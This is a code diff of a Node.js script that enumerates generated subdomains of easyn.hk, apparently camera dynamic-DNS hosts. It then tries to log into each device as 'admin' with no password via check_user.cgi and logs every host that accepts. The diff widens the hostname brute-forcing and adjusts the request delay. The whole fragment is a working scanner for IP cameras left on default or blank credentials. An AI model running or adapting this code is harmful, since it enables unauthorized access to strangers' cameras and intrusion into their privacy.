@@ -20,18 +20,14 @@ var logger = new (winston.Logger)({
 
 var url = '';
 for(a=97 ; a<98 ; a++) {
-for(a=97 ; a<99 ; a++) {
-	for(b=97 ; b<123 ; b++) {
-		for(c=97 ; c<123 ; c++) {
-			for(d=97 ; d<123 ; d++) {
-				url = 'http://' + String.fromCharCode(a,b,c,d) + '.easyn.hk';
-				getLink(url);
-                sleep.usleep(500);
-			}
-		}
-	}
-}
-}
+for(b=97 ; b<99 ; b++) {
+for(c=97 ; c<123 ; c++) {
+for(d=97 ; d<123 ; d++) {
+for(e=97 ; e<123 ; e++) {
+    url = 'http://' + String.fromCharCode(a,b,c,d,e) + '.easyn.hk';
+	getLink(url);
+    sleep.usleep(500000);
+}}}}}
 
 //url = 'http://002mhew.nwsvr.com';
 //getLink(url);
@@ -68,7 +64,6 @@ function checkCountry(url,link) {
 
 function login(url,link) {
 	link = 'http://admin@' + link.substr(7) + '/check_user.cgi';
-    console.log(link);
     request({url: link}, function (error, response, body) {
     if (!error && response.statusCode == 200) {
         logger.log('info','%s',	url);
